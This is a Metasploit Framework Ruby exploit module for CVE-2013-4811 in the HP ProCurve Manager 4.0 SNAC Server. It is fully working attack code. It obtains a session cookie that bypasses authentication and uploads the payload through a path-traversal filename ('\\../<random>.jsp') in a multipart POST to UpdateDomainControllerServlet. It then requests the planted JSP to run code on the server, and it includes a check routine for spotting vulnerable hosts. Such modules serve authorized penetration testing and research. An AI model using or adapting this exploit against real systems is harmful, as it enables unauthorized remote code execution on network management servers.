# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The
        vulnerability in the UpdateDomainControllerServlet allows an attacker to upload arbitrary
        files, just having into account binary writes aren&#039;t allowed. Additionally, authentication
        can be bypassed in order to upload the file. This module has been tested successfully on
        the SNAC server installed with HP ProCurve Manager 4.0.
      },
      &#039;Author&#039;         =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-4811&#039; ],
          [ &#039;OSVDB&#039;, &#039;97154&#039; ],
          [ &#039;BID&#039;, &#039;62349&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-226/&#039; ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [ &#039;HP ProCurve Manager 4.0 SNAC Server&#039;, {} ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
        },
      &#039;DisclosureDate&#039; => &#039;Sep 09 2013&#039;))

    register_options(
      [
        Opt::RPORT(443)
      ], self.class )
  end

  def check
    session = get_session
    if session.nil?
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({
      &#039;uri&#039; => "/RegWeb/RegWeb/GetDomainControllerServlet",
      &#039;cookie&#039; => session
    })

    if res and res.code == 200 and res.body =~ /domainName/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def get_session
    res = send_request_cgi({ &#039;uri&#039; => "/RegWeb/html/snac/index.html" })
    session = nil
    if res and res.code == 200
      session = res.get_cookies
    end

    if session and not session.empty?
      return session
    end

    return nil
  end

  def exploit_upload(session)
    jsp_name = "#{rand_text_alphanumeric(8+rand(8))}.jsp"
    post_message = Rex::MIME::Message.new
    post_message.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"adCert\"; filename=\"\\../#{jsp_name}\"")
    post_message.add_part("{}", nil, nil, "form-data; name=\"ad_data\"")
    post_message.add_part("add", nil, nil, "form-data; name=\"ad_action\"")
    data = post_message.to_s
    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

    res = send_request_cgi(
      {
        &#039;uri&#039;    => "/RegWeb/RegWeb/UpdateDomainControllerServlet",
        &#039;method&#039; => &#039;POST&#039;,
        &#039;ctype&#039;    => "multipart/form-data; boundary=#{post_message.bound}",
        &#039;cookie&#039; => session,
        &#039;data&#039;    => data,
      })

    if res and res.code == 200 and res.body =~ /success:false/
      return jsp_name
    end

    return nil
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def exploit
    print_status("#{peer} - Getting a valid session...")
    session = get_session
    if session.nil?
      fail_with(Failure::NoTarget, "#{peer} - Failed to get a valid session")
    end

    print_status("#{peer} - Uploading payload...")
    jsp = exploit_upload(session)
    unless jsp
      fail_with(Failure::NotVulnerable, "#{peer} - Upload failed")
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({ &#039;uri&#039; => "/RegWeb/#{jsp}" })
  end

end

